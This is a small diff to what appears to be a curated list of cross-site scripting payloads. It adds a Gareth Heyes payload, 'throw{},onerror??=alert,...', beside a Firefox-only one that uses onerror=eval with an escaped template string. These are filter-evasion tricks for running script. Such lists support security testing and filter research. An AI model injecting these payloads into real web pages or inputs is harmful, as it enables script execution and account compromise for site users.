@@ -68,6 +68,12 @@ Only Chrome [Garethheyes](http://www.thespanner.co.uk/2012/05/01/xss-technique-w
 
 ----
 
+[Garethheyes](https://twitter.com/garethheyes/status/1519042089429999617)
+
+    throw{},onerror??=alert,"XSS"??123
+
+----
+
 Only Firefox [h43z](https://twitter.com/h43z)
 
     throw onerror=eval,SyntaxError`alert\x2823\x29` 
